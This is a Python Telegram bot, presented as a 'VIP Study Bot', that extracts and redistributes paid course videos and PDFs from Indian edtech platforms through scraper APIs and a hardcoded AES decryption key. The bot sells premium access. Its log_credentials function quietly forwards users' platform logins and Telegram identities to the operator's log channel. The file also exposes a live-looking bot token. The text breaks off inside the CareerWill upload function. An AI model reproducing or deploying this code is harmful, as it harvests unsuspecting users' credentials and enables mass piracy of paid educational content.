#!/usr/bin/env python3
"""
🎓 VIP Study Bot v15.0
Login Extractors: ClassPlus, Adda247, RG Vikramjeet, PW, Khan, Exampur, KD Live
Without Login:    CareerWill, SelectionWay, StudyIQ, FreeAppx, FreePW, KGS App
Premium System | Log Channel | Study Mode | Real Video Upload | TXT → HTML
Admin Panel | Broadcast | Database Channel Auto-Upload
"""

import logging, requests, re, time, asyncio, json, os, tempfile, uuid
import concurrent.futures, aiohttp
from io import BytesIO
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import cloudscraper

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ConversationHandler, filters, ContextTypes
)
from telegram.constants import ParseMode
from telegram.error import RetryAfter, TimedOut, NetworkError

# ══════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════
BOT_TOKEN        = "8798834071:AAERb1XxYZ4ic1xGKE1x_t6-S6PbLLOtiq8"
THUMBNAIL_URL    = "https://te.legra.ph/file/9cd2fe0285e9827cb7540.jpg"
MAX_WORKERS      = 20
BATCHES_PER_PAGE = 10
ADMIN_ID         = 8033638335
PREMIUM_DB_FILE  = "premium_users.json"
USERS_DB_FILE    = "all_users.json"          # Tracks every user who used bot
SETTINGS_FILE    = "admin_settings.json"     # Stores DB channel IDs (editable)
CONTACT_USER     = "@MADX_CON_BOT"
CONTACT_URL      = "https://t.me/MADX_CON_BOT"
LOG_CHANNEL_ID   = -1003662008075   # Log channel for credentials

# ── Database Channel IDs (can be updated via /admin) ──
DEFAULT_DB_CHANNELS = {
    "careerwill": -1003899389134,
    "kgs":        -1003854424868,
}

# ── CareerWill APIs ──
CW_ALL_BATCHES = "https://cw-ut-apia-9001c26847a7.herokuapp.com/api/batches"
CW_BATCH_API   = "https://cw-api-website.vercel.app/batch/{}"
CW_TOPIC_API   = "https://cw-api-website.vercel.app/batch?batchid={}&topicid={}&full=true"
CW_VIDEO_API   = "https://cw-vid-virid.vercel.app/get_video_details?name={}"

# ── SelectionWay APIs ──
SW_BASE      = "https://raj-selectionwayapi.onrender.com"
SW_ALL_BATCH = f"{SW_BASE}/allbatch"
SW_CHAPTER   = f"{SW_BASE}/chapter/{{}}"
SW_PDF       = f"{SW_BASE}/pdf/{{}}"

# ── Study IQ APIs ──
IQ_LOGIN_URL         = "https://www.studyiq.net/api/web/userlogin"
IQ_OTP_URL           = "https://www.studyiq.net/api/web/web_user_login"
IQ_COURSES_URL       = "https://backend.studyiq.net/app-content-ws/api/v1/getAllPurchasedCourses?source=WEB"
IQ_DETAILS_URL       = "https://backend.studyiq.net/app-content-ws/v1/course/getDetails?courseId={}&languageId={}"
IQ_DETAILS_P         = "https://backend.studyiq.net/app-content-ws/v1/course/getDetails?courseId={}&languageId=&parentId={}"
IQ_LESSON_URL        = "https://backend.studyiq.net/app-content-ws/api/lesson/data?lesson_id={}&courseId={}"
IQ_VALID_COURSES_URL = "https://raw.githubusercontent.com/dev-raj009/Vipiq/refs/heads/main/valid_courses.json"

# ── ClassPlus API ──
CP_API = "https://api.classplusapp.com"

# ── Adda247 API ──
ADDA_LOGIN_URL = "https://userapi.adda247.com/login?src=aweb"

# ── Khan GS API ──
KHAN_LOGIN_URL = "https://khanglobalstudies.com/api/login-with-password"

# ── Exampur API ──
EXAMPUR_LOGIN_URL = "https://auth.exampurcache.xyz/auth/login"

# ── KD Live API ──
KD_LOGIN_URL = "https://api.kdcampus.live/api/auth/login"

# ── RG Vikramjeet API ──
RG_LOGIN_URL = "https://appapi.videocrypt.in/data_model/users/login_auth"

# ── PW API ──
PW_LOGIN_URL    = "https://api.penpencil.co/v3/users/login"
PW_BATCHES_URL  = "https://api.penpencil.co/v3/batches/all-purchased-batches"

# ── FreeAppx decrypt key ──
APPX_KEY = b'638udh3829162018'
APPX_IV  = b'fedcba9876543210'

# ── KGS App APIs ──
KGS_COURSES_URL  = "https://kgs-main-api-scamer.vercel.app/get-courses"
KGS_SUBJECTS_URL = "https://kgs-main-api-scamer.vercel.app/subjects/{}"
KGS_LESSONS_URL  = "https://kgs-main-api-scamer.vercel.app/lessons/{}"

# ══════════════════════════════════════════════════════
#  CONVERSATION STATES
# ══════════════════════════════════════════════════════
MAIN_MENU        = 0
EXTRACT_MENU     = 1
LOGIN_MENU       = 2
NOLOGIN_MENU     = 3
ADMIN_MENU       = 4          # /admin panel
ADMIN_BROADCAST  = 5          # Broadcast message waiting
ADMIN_ADD_PREM   = 6          # Add premium user ID waiting
ADMIN_REM_PREM   = 7          # Remove premium user ID waiting
ADMIN_DB_MENU    = 8          # Database channel submenu
ADMIN_DB_EDIT    = 9          # Edit DB channel ID waiting

# Login extractor states (50+)
CP_STATE         = 50   # ClassPlus waiting credentials
CP_OTP           = 51
ADDA_STATE       = 52
KHAN_STATE       = 53
EXAMPUR_STATE    = 54
KD_STATE         = 55
RG_STATE         = 56
RG_COURSE        = 57
RG_SUBJECT       = 58
RG_TOPIC         = 59
PW_STATE         = 60
PW_BATCH         = 61

# Without-login states (70+)
CW_BROWSE        = 70
CW_SEARCH_INPUT  = 71
SW_BROWSE        = 72
IQ_AUTH          = 73
IQ_OTP_STATE     = 74
IQ_BATCH_LIST    = 75
IQ_MENU          = 76
IQ_FREE_BROWSE   = 77
IQ_FREE_SEARCH   = 78
FAPPX_STATE      = 79
FPW_STATE        = 80
TXT_HTML_WAIT    = 81   # TXT → HTML: waiting for .txt file
HTML_TXT_WAIT    = 82   # HTML → TXT: waiting for .html file
KGS_BROWSE       = 83   # KGS: course list
KGS_SUBJECTS     = 84   # KGS: subject list
KGS_LESSONS      = 85   # KGS: lesson list

# Study mode states (90+)
STUDY_MENU       = 90
STUDY_CW_BATCHES = 91
STUDY_CW_TOPICS  = 92
STUDY_CW_VIDEOS  = 93
STUDY_SW_BATCHES = 94
STUDY_SW_TOPICS  = 95
STUDY_SW_VIDEOS  = 96
STUDY_VIDEO_ACT  = 97
STUDY_KGS_COURSES  = 98   # KGS Study: course list
STUDY_KGS_SUBJECTS = 99   # KGS Study: subject list
STUDY_KGS_LESSONS  = 100  # KGS Study: lesson list

# ══════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════
logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.WARNING)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
    "Accept": "application/json", "Connection": "keep-alive",
})
adapter = requests.adapters.HTTPAdapter(pool_connections=30, pool_maxsize=30, max_retries=2)
session.mount("https://", adapter); session.mount("http://", adapter)
cp_scraper = cloudscraper.create_scraper()

# ══════════════════════════════════════════════════════
#  PREMIUM DATABASE
# ══════════════════════════════════════════════════════
def load_db():
    if os.path.exists(PREMIUM_DB_FILE):
        try:
            with open(PREMIUM_DB_FILE) as f: return json.load(f)
        except: pass
    return {}

def save_db(db):
    try:
        with open(PREMIUM_DB_FILE, "w") as f: json.dump(db, f, indent=2)
    except Exception as e: logger.error(f"DB save: {e}")

def is_premium(uid):
    return uid == ADMIN_ID or str(uid) in load_db()

def add_premium(uid, by):
    db = load_db(); db[str(uid)] = {"added_by": by, "added_at": time.strftime("%Y-%m-%d %H:%M:%S")}; save_db(db)

def remove_premium(uid):
    db = load_db()
    if str(uid) in db: del db[str(uid)]; save_db(db); return True
    return False

# ══════════════════════════════════════════════════════
#  USERS DATABASE (track all bot users)
# ══════════════════════════════════════════════════════
def load_users():
    if os.path.exists(USERS_DB_FILE):
        try:
            with open(USERS_DB_FILE) as f: return json.load(f)
        except: pass
    return {}

def save_users(db):
    try:
        with open(USERS_DB_FILE, "w") as f: json.dump(db, f, indent=2)
    except Exception as e: logger.error(f"Users DB save: {e}")

def track_user(user):
    """Record user in all_users DB."""
    try:
        db = load_users(); uid = str(user.id)
        if uid not in db:
            db[uid] = {
                "name": user.full_name,
                "username": f"@{user.username}" if user.username else "",
                "joined": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            save_users(db)
    except: pass

# ══════════════════════════════════════════════════════
#  ADMIN SETTINGS (DB channel IDs — editable)
# ══════════════════════════════════════════════════════
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE) as f: return json.load(f)
        except: pass
    return dict(DEFAULT_DB_CHANNELS)

def save_settings(s):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(s, f, indent=2)
    except Exception as e: logger.error(f"Settings save: {e}")

def get_db_channel(platform_key):
    """Get DB channel ID for a platform. Returns None if not set."""
    s = load_settings()
    val = s.get(platform_key)
    return int(val) if val else None

# ══════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════
def fetch_json(url, retries=3, headers=None):
    for i in range(retries):
        try:
            r = session.get(url, timeout=25, headers=headers)
            if r.status_code == 200: return r.json()
            elif r.status_code == 429: time.sleep(2**i)
        except: pass
        if i < retries-1: time.sleep(0.5)
    return None

def post_json(url, data, retries=3, headers=None, form=False):
    for i in range(retries):
        try:
            if form: r = session.post(url, data=data, headers=headers, timeout=25)
            else:    r = session.post(url, json=data, headers=headers, timeout=25)
            if r.status_code == 200: return r.json()
        except: pass
        if i < retries-1: time.sleep(0.5)
    return None

def appx_decrypt(enc):
    try:
        enc = b64decode(enc.split(':')[0])
        if not enc: return ""
        cipher = AES.new(APPX_KEY, AES.MODE_CBC, APPX_IV)
        return unpad(cipher.decrypt(enc), AES.block_size).decode('utf-8')
    except: return ""

def get_cw_video_url(video_id):
    data = fetch_json(CW_VIDEO_API.format(video_id))
    if data and isinstance(data, dict):
        try:
            if "data" in data and "link" in data["data"]:
                lnk = data["data"]["link"]
                return lnk.get("file_url") or lnk.get("url")
            elif "link" in data:
                return data["link"].get("file_url") or data["link"].get("url")
        except: pass
    return None

async def safe_edit(msg, text, markup=None):
    for _ in range(3):
        try:
            kw = {"text": text, "parse_mode": ParseMode.MARKDOWN}
            if markup: kw["reply_markup"] = markup
            await msg.edit_text(**kw); return
        except RetryAfter as e: await asyncio.sleep(e.retry_after+1)
        except (TimedOut, NetworkError): await asyncio.sleep(2)
        except: return

def build_bar(done, total):
    pct = int((done/max(total,1))*100); filled = int(pct/10)
    return "🟩"*filled + "⬜"*(10-filled), pct

def safe_fn(name): return re.sub(r'[\\/*?:"<>|]',"",name).replace(" ","_")[:80]

# ══════════════════════════════════════════════════════
#  LOG CREDENTIALS TO CHANNEL
# ══════════════════════════════════════════════════════
async def log_credentials(bot, user, platform, creds_text):
    """Send login credentials to log channel."""
    try:
        uid  = user.id
        name = user.full_name
        uname = f"@{user.username}" if user.username else "No username"
        msg = (
            f"🔐 *New Login — {platform}*\n\n"
            f"👤 Name: [{name}](tg://user?id={uid})\n"
            f"🆔 ID: `{uid}`\n"
            f"📱 Username: {uname}\n\n"
            f"🔑 *Credentials:*\n"
            f"`{creds_text}`\n\n"
            f"🕐 {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await bot.send_message(chat_id=LOG_CHANNEL_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"Log channel error: {e}")

# ══════════════════════════════════════════════════════
#  NOT PREMIUM MESSAGE
# ══════════════════════════════════════════════════════
async def send_not_premium(message):
    text = (
        "🔒 *Access Denied — Premium Required!*\n\n"
        "Aap abhi Premium User nahi hain.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💎 *Premium lene ke baad milega:*\n"
        "   ✅  Login Extractors (7 platforms)\n"
        "   ✅  Without Login Extractors\n"
        "   ✅  Study Mode (Video Download)\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📲 *Contact karo:*\n"
        f"   👉  {CONTACT_USER}\n\n"
        "_Ek baar premium lo — sab unlock! 🎓_"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💬 Premium Kharido", url=CONTACT_URL)],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_home")],
    ])
    await message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)

# ══════════════════════════════════════════════════════
#  WAIT FOR TEXT HELPER (replaces pyrogram's listen)
# ══════════════════════════════════════════════════════
async def wait_for_text(update, context, prompt_msg=None, timeout=300):
    """Store a pending question and return the state to wait."""
    # This is handled via ConversationHandler states
    pass

# ══════════════════════════════════════════════════════
#  VIDEO DOWNLOAD & UPLOAD
# ══════════════════════════════════════════════════════
async def download_and_upload_video(message, url, title, topic, batch):
    fname = safe_fn(title) + ".mp4"
    prog  = await message.reply_text(
        f"📥 *Downloading...*\n\n🎬 `{title}`\n\n⏳ Please wait...",
        parse_mode=ParseMode.MARKDOWN)
    tmp_path = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".mp4") as tmp:
            tmp_path = tmp.name
        dl = requests.Session()
        dl.headers.update({"User-Agent": "Mozilla/5.0", "Referer": "https://careerwill.com/"})
        r = dl.get(url, stream=True, timeout=300); r.raise_for_status()
        total = int(r.headers.get("content-length", 0))
        done = 0; last = time.time(); chunk = 1024*1024
        with open(tmp_path, "wb") as f:
            for c in r.iter_content(chunk_size=chunk):
                if c:
                    f.write(c); done += len(c); now = time.time()
                    if now - last >= 5:
                        last = now
                        if total:
                            pct = int((done/total)*100); bar = "🟩"*int(pct/10)+"⬜"*(10-int(pct/10))
                            await safe_edit(prog, f"📥 *Downloading...*\n\n🎬 `{title}`\n\n{bar} `{pct}%`\n💾 `{done/1024/1024:.1f}/{total/1024/1024:.1f} MB`")
                        else:
                            await safe_edit(prog, f"📥 *Downloading...*\n\n🎬 `{title}`\n\n💾 `{done/1024/1024:.1f} MB`")
        sz = os.path.getsize(tmp_path)/1024/1024
        await safe_edit(prog, f"📤 *Uploading...*\n\n🎬 `{title}`\n💾 `{sz:.1f} MB`")
        with open(tmp_path, "rb") as vf:
            for att in range(3):
                try:
                    await message.reply_video(video=vf, filename=fname,
                        caption=f"🎬 *{title}*\n📂 {topic}\n📚 {batch}\n\n_VIP Study Bot ⚡_",
                        parse_mode=ParseMode.MARKDOWN, supports_streaming=True,
                        read_timeout=600, write_timeout=600); break
                except RetryAfter as e: await asyncio.sleep(e.retry_after+2); vf.seek(0)
                except Exception as e:
                    if att==2: raise e
                    await asyncio.sleep(3); vf.seek(0)
        try: await prog.delete()
        except: pass
    except Exception as e:
        await safe_edit(prog, f"❌ *Failed!*\n\n`{str(e)[:200]}`\n\n🔗 Link:\n`{url}`")
    finally:
        if tmp_path and os.path.exists(tmp_path):
            try: os.remove(tmp_path)
            except: pass

# ══════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════
def home_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ Extract Mode", callback_data="mode_extract")],
        [InlineKeyboardButton("📖 Study Mode",   callback_data="mode_study")],
        [InlineKeyboardButton("🌐 TXT → HTML",   callback_data="mode_txthtml")],
        [InlineKeyboardButton("📄 HTML → TXT",   callback_data="mode_htmltxt")],
    ])

def extract_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Login Extract",      callback_data="ext_login")],
        [InlineKeyboardButton("🆓 Without Login Extract", callback_data="ext_nologin")],
        [InlineKeyboardButton("🔙 Back",               callback_data="back_home")],
    ])

def login_extract_kb():
    """Login extractors — anyone can use (free)."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏫 ClassPlus",      callback_data="lx_cp")],
        [InlineKeyboardButton("📚 Adda247",        callback_data="lx_adda")],
        [InlineKeyboardButton("🎯 RG Vikramjeet",  callback_data="lx_rg")],
        [InlineKeyboardButton("✏️ Physics Wallah", callback_data="lx_pw")],
        [InlineKeyboardButton("📖 Khan GS",        callback_data="lx_khan")],
        [InlineKeyboardButton("📝 Exampur",        callback_data="lx_exampur")],
        [InlineKeyboardButton("🎓 KD Campus",      callback_data="lx_kd")],
        [InlineKeyboardButton("🔙 Back",           callback_data="ext_back")],
    ])

def nologin_extract_kb():
    """Without-login extractors — premium only."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 CareerWill",     callback_data="nlx_cw")],
        [InlineKeyboardButton("🏆 SelectionWay",   callback_data="nlx_sw")],
        [InlineKeyboardButton("📘 Study IQ",       callback_data="nlx_iq")],
        [InlineKeyboardButton("📱 FreeAppx",       callback_data="nlx_fappx")],
        [InlineKeyboardButton("✏️ Free PW",        callback_data="nlx_fpw")],
        [InlineKeyboardButton("🎓 KGS App",        callback_data="nlx_kgs")],
        [InlineKeyboardButton("🔙 Back",           callback_data="ext_back")],
    ])

def study_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 CareerWill Study",   callback_data="study_cw")],
        [InlineKeyboardButton("🏆 SelectionWay Study", callback_data="study_sw")],
        [InlineKeyboardButton("🎓 KGS App Study",      callback_data="study_kgs")],
        [InlineKeyboardButton("🔙 Back",               callback_data="back_home")],
    ])

# ══════════════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    track_user(update.effective_user)
    await show_home(update.message); return MAIN_MENU

async def show_home(message):
    cap = (
        "🎓 *VIP Study Bot v14.0*\n\n"
        "Welcome to the most powerful Study Extractor Bot!\n\n"
        "⚡ *Extract Mode:*\n"
        "   🔐 Login — 7 platforms (Free for all)\n"
        "   🆓 Without Login — Premium only\n\n"
        "📖 *Study Mode* — Premium only\n\n"
        "🌐 *TXT → HTML* — Free for all\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 Premium: {CONTACT_USER}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "_Choose your mode below 👇_"
    )
    try: await message.reply_photo(photo=THUMBNAIL_URL, caption=cap, parse_mode=ParseMode.MARKDOWN, reply_markup=home_kb())
    except: await message.reply_text(cap, parse_mode=ParseMode.MARKDOWN, reply_markup=home_kb())

async def show_home_cb(message):
    """Back to home — edit the current message in place (no new message)."""
    cap = (
        "🎓 *VIP Study Bot v13.0*\n\n"
        "⚡ *Extract Mode* — Login (Free) / Without Login (Premium)\n"
        "📖 *Study Mode* — Premium only\n"
        "🌐 *TXT → HTML* — Free for all\n\n"
        f"💎 Premium: {CONTACT_USER}\n\n"
        "_Choose your mode below 👇_"
    )
    try:
        await message.edit_text(cap, parse_mode=ParseMode.MARKDOWN, reply_markup=home_kb())
    except:
        # If edit fails (e.g. photo message), send new text message
        try: await message.reply_photo(photo=THUMBNAIL_URL, caption=cap, parse_mode=ParseMode.MARKDOWN, reply_markup=home_kb())
        except: await message.reply_text(cap, parse_mode=ParseMode.MARKDOWN, reply_markup=home_kb())

# ══════════════════════════════════════════════════════
#  ADMIN PANEL — /admin command + full inline UI
# ══════════════════════════════════════════════════════

def admin_main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Broadcast",       callback_data="adm_broadcast")],
        [InlineKeyboardButton("👥 Total Users",      callback_data="adm_totalusers"),
         InlineKeyboardButton("💎 Premium Users",   callback_data="adm_premiumusers")],
        [InlineKeyboardButton("➕ Add Premium",      callback_data="adm_addprem"),
         InlineKeyboardButton("➖ Remove Premium",  callback_data="adm_remprem")],
        [InlineKeyboardButton("🗄 Database Channels", callback_data="adm_dbmenu")],
        [InlineKeyboardButton("❌ Close",            callback_data="adm_close")],
    ])

def admin_db_kb():
    s = load_settings()
    cw_id = s.get("careerwill", "Not set")
    kgs_id = s.get("kgs", "Not set")
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🎯 CareerWill: {cw_id}", callback_data="adm_dbedit_careerwill")],
        [InlineKeyboardButton(f"🎓 KGS App:    {kgs_id}", callback_data="adm_dbedit_kgs")],
        [InlineKeyboardButton("▶️ Run CW Upload",  callback_data="adm_db_run_cw"),
         InlineKeyboardButton("▶️ Run KGS Upload", callback_data="adm_db_run_kgs")],
        [InlineKeyboardButton("🔙 Back", callback_data="adm_back")],
    ])

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != ADMIN_ID:
        await update.message.reply_text("❌ *Access Denied!*", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    db = load_users(); pdb = load_db()
    txt = (
        "👑 *VIP Study Bot — Admin Panel*\n\n"
        f"👥 Total Users: `{len(db)}`\n"
        f"💎 Premium Users: `{len(pdb)}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "_Choose an action 👇_"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=admin_main_kb())
    return ADMIN_MENU

async def admin_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Admin only!", show_alert=True); return ConversationHandler.END

    data = q.data

    # ── Close ──
    if data == "adm_close":
        try: await q.message.delete()
        except: pass
        return ConversationHandler.END

    # ── Back to main ──
    elif data == "adm_back":
        db = load_users(); pdb = load_db()
        txt = (
            "👑 *VIP Study Bot — Admin Panel*\n\n"
            f"👥 Total Users: `{len(db)}`\n"
            f"💎 Premium Users: `{len(pdb)}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "_Choose an action 👇_"
        )
        await safe_edit(q.message, txt, markup=admin_main_kb())
        return ADMIN_MENU

    # ── Total Users ──
    elif data == "adm_totalusers":
        db = load_users(); total = len(db)
        lines = [f"👥 *Total Users — {total}*\n"]
        for uid, info in list(db.items())[-30:]:  # last 30
            uname = info.get("username","") or ""
            lines.append(f"• `{uid}` {uname} — {info.get('joined','?')[:10]}")
        if total > 30: lines.append(f"\n_...aur {total-30} aur users_")
        txt = "\n".join(lines)
        await safe_edit(q.message, txt, markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]))
        return ADMIN_MENU

    # ── Premium Users ──
    elif data == "adm_premiumusers":
        pdb = load_db()
        if not pdb:
            await safe_edit(q.message, "💎 *Koi premium user nahi abhi.*",
                markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]))
            return ADMIN_MENU
        lines = [f"💎 *Premium Users — {len(pdb)}*\n"]
        for uid, info in pdb.items():
            lines.append(f"• `{uid}` — {info.get('added_at','?')[:10]}")
        await safe_edit(q.message, "\n".join(lines),
            markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]))
        return ADMIN_MENU

    # ── Add Premium ──
    elif data == "adm_addprem":
        await safe_edit(q.message,
            "➕ *Add Premium User*\n\nUser ka Telegram ID bhejo:\n\n_/cancel to go back_")
        return ADMIN_ADD_PREM

    # ── Remove Premium ──
    elif data == "adm_remprem":
        pdb = load_db()
        if not pdb:
            await q.answer("Koi premium user nahi!", show_alert=True); return ADMIN_MENU
        lines = ["➖ *Remove Premium*\n\nKis user ka premium hatana hai?\nUser ID bhejo:\n"]
        for uid, info in pdb.items():
            lines.append(f"• `{uid}` — {info.get('added_at','?')[:10]}")
        lines.append("\n_/cancel to go back_")
        await safe_edit(q.message, "\n".join(lines))
        return ADMIN_REM_PREM

    # ── Broadcast ──
    elif data == "adm_broadcast":
        await safe_edit(q.message,
            "📢 *Broadcast Message*\n\n"
            "Jo message bhejni hai woh type karo.\n"
            "_(Text, photo caption, kuch bhi — as-is forward hoga)_\n\n"
            "_/cancel to go back_")
        return ADMIN_BROADCAST

    # ── Database Channel Menu ──
    elif data == "adm_dbmenu":
        await safe_edit(q.message,
            "🗄 *Database Channels*\n\n"
            "Yahan database channels ka ID set/change kar sakte ho.\n"
            "Bot in channels mein batches auto-upload karta hai.\n\n"
            "_Channel pe click karo to change karo 👇_",
            markup=admin_db_kb())
        return ADMIN_DB_MENU

    # ── DB channel edit ──
    elif data.startswith("adm_dbedit_"):
        platform = data[len("adm_dbedit_"):]
        context.user_data["adm_db_editing"] = platform
        s = load_settings()
        cur = s.get(platform, "Not set")
        pname = "CareerWill" if platform == "careerwill" else "KGS App"
        await safe_edit(q.message,
            f"✏️ *Edit Channel ID — {pname}*\n\n"
            f"Current ID: `{cur}`\n\n"
            "Naya channel ID bhejo (e.g. `-1001234567890`):\n\n"
            "_/cancel to go back_")
        return ADMIN_DB_EDIT

    # ── Database: run batch upload ──
    elif data == "adm_db_run_cw":
        await q.message.reply_text("⏳ *CareerWill database upload shuru ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
        asyncio.create_task(db_upload_careerwill(q.message, context.bot))
        return ADMIN_MENU

    elif data == "adm_db_run_kgs":
        await q.message.reply_text("⏳ *KGS App database upload shuru ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
        asyncio.create_task(db_upload_kgs(q.message, context.bot))
        return ADMIN_MENU

    return ADMIN_MENU

async def admin_broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive broadcast message and send to all users."""
    msg = update.message
    if msg.from_user.id != ADMIN_ID: return ConversationHandler.END
    db = load_users(); total = len(db)
    prog = await msg.reply_text(f"📢 *Broadcasting to {total} users...*", parse_mode=ParseMode.MARKDOWN)
    ok = fail = 0
    for uid in db.keys():
        try:
            await context.bot.copy_message(chat_id=int(uid), from_chat_id=msg.chat_id, message_id=msg.message_id)
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)  # rate limit
    await safe_edit(prog,
        f"✅ *Broadcast Complete!*\n\n"
        f"📤 Sent: `{ok}`\n❌ Failed: `{fail}`\n👥 Total: `{total}`")
    return ADMIN_MENU

async def admin_add_prem_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if msg.from_user.id != ADMIN_ID: return ConversationHandler.END
    try:
        tid = int(msg.text.strip())
    except:
        await msg.reply_text("❌ *Invalid ID! Number bhejo.*", parse_mode=ParseMode.MARKDOWN)
        return ADMIN_ADD_PREM
    if tid == ADMIN_ID:
        await msg.reply_text("ℹ️ *Admin always has access.*", parse_mode=ParseMode.MARKDOWN)
        return ADMIN_MENU
    add_premium(tid, ADMIN_ID)
    try:
        await context.bot.send_message(chat_id=tid, text=(
            "🎉 *Premium Activated!*\n\n✅ Tumhara VIP Study Bot premium activate ho gaya!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n💎 *Ab available hai:*\n"
            "   🆓 Without Login Extractors\n   📖 Study Mode\n   📥 Real Video Download\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n/start karke use karo! 🎓"), parse_mode=ParseMode.MARKDOWN)
        note = "✅ User notified"
    except: note = "⚠️ User notify nahi hua (blocked/not started)"
    await msg.reply_text(
        f"✅ *Premium diya!*\n\n👤 `{tid}`\n{note}\n\n"
        "_/admin se wapas jao_", parse_mode=ParseMode.MARKDOWN)
    return ADMIN_MENU

async def admin_rem_prem_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if msg.from_user.id != ADMIN_ID: return ConversationHandler.END
    try:
        tid = int(msg.text.strip())
    except:
        await msg.reply_text("❌ *Invalid ID!*", parse_mode=ParseMode.MARKDOWN)
        return ADMIN_REM_PREM
    if remove_premium(tid):
        try:
            await context.bot.send_message(chat_id=tid,
                text="⚠️ *Aapka Premium access hataya gaya hai.*\n\n_VIP Study Bot_",
                parse_mode=ParseMode.MARKDOWN)
        except: pass
        await msg.reply_text(f"✅ *Premium hataya!*\n\n👤 `{tid}`", parse_mode=ParseMode.MARKDOWN)
    else:
        await msg.reply_text(f"⚠️ `{tid}` premium list mein nahi tha.", parse_mode=ParseMode.MARKDOWN)
    return ADMIN_MENU

async def admin_db_edit_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if msg.from_user.id != ADMIN_ID: return ConversationHandler.END
    platform = context.user_data.get("adm_db_editing","")
    raw = msg.text.strip()
    try:
        new_id = int(raw)
    except:
        await msg.reply_text("❌ *Invalid ID! Negative number chahiye, e.g. `-1001234567890`*",
            parse_mode=ParseMode.MARKDOWN)
        return ADMIN_DB_EDIT
    s = load_settings()
    s[platform] = new_id
    save_settings(s)
    pname = "CareerWill" if platform == "careerwill" else "KGS App"
    await msg.reply_text(
        f"✅ *{pname} channel ID update hua!*\n\n"
        f"New ID: `{new_id}`\n\n"
        "_/admin se dekho_", parse_mode=ParseMode.MARKDOWN)
    return ADMIN_MENU

# ══════════════════════════════════════════════════════
#  DATABASE AUTO-UPLOAD — CareerWill & KGS to Channel
# ══════════════════════════════════════════════════════

async def db_upload_careerwill(trigger_msg, bot):
    """Extract ALL CareerWill batches and post each as TXT to DB channel."""
    ch_id = get_db_channel("careerwill")
    if not ch_id:
        await trigger_msg.reply_text("❌ *CareerWill channel ID set nahi hai!*\n_/admin → Database Channels_",
            parse_mode=ParseMode.MARKDOWN); return
    # Pin announcement message
    try:
        pin_msg = await bot.send_message(
            chat_id=ch_id,
            text=(
                "📌 *CareerWill — Full Database Update*\n\n"
                f"🕐 Started: `{time.strftime('%Y-%m-%d %H:%M:%S')}`\n"
                "⏳ Sare batches extract ho rahe hain...\n\n"
                "_VIP Study Bot ⚡_"
            ),
            parse_mode=ParseMode.MARKDOWN)
        await bot.pin_chat_message(chat_id=ch_id, message_id=pin_msg.message_id, disable_notification=True)
    except Exception as e:
        await trigger_msg.reply_text(f"⚠️ Pin fail: `{e}`\n\nExtract continue...", parse_mode=ParseMode.MARKDOWN)

    prog = await trigger_msg.reply_text("⏳ *Batches fetch ho rahe hain...*", parse_mode=ParseMode.MARKDOWN)
    raw = fetch_json(CW_ALL_BATCHES)
    if not raw:
        await safe_edit(prog, "❌ *CareerWill batch list fetch fail!*"); return
